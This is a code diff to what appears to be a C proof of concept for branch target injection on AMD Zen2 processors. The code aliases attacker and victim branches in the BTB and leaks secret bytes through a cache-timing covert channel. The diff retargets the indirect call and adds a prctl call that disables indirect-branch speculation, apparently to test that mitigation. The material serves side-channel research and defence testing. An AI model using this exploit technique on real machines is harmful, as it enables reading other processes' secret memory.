@@ -16,6 +16,9 @@
 #include <sys/mman.h>
 #include <unistd.h>
 
+#include <sys/prctl.h>
+#include <linux/prctl.h>
+
 /* The rdtscp in itself takes about 60 cycles on Zen2 */
 #define CACHE_HIT_THRESHOLD 80
 /* Covert channel */
@@ -59,7 +62,7 @@ asm (
 
 /* These two addresses are carefully chosen to alias in the BTB. */
 #define ATTACKER_BRANCH_ADDRESS 0x41bababababf
-#define VICTIM_BRANCH_ADDRESS 0x41b2ba3abae1
+#define VICTIM_BRANCH_ADDRESS (0x41bababababf ^ 0x20020000)
 
 void flush();
 void measure();
@@ -73,7 +76,6 @@ void victim_insns__end();
 asm (
   ".align 0x80000\n"
   "victim_insns:\n"
-  NOPS_str(0x21)
   "jmp *(%r11)\n"
   "victim_insns__end:\n"
 );
@@ -83,7 +85,6 @@ void attacker_insns__end();
 asm (
   ".align 0x80000\n"
   "attacker_insns:\n"
-  NOPS_str(0x21)
   "jmp *(%r11)\n"
   "attacker_insns__end:\n"
 );
@@ -157,7 +158,7 @@ void do_bti_and_read_byte(char *secret_addr, char secret_value[2],
         [leak_addr] "r"(dummy),
         [covert_channel] "r"(covert_channel),
         [branch_history] "r" (branch_history),
-        [icall] "r" (ATTACKER_BRANCH_ADDRESS)
+        [icall] "r" (VICTIM_BRANCH_ADDRESS)
       : "rax", "rdi", "rsi", "r11", "rax");
 
       asm("flush:\n");
@@ -229,6 +230,9 @@ void do_bti_and_read_byte(char *secret_addr, char secret_value[2],
         (hits[winner] == 2 && hits[runner_up] == 0)) {
       break;
     }
+  if (prctl(PR_SET_SPECULATION_CTRL, PR_SPEC_INDIRECT_BRANCH, PR_SPEC_DISABLE, 0, 0) == -1) {
+      printf("prctl failed\n");
+  }
   }
 
   secret_value[0] = (char)winner;
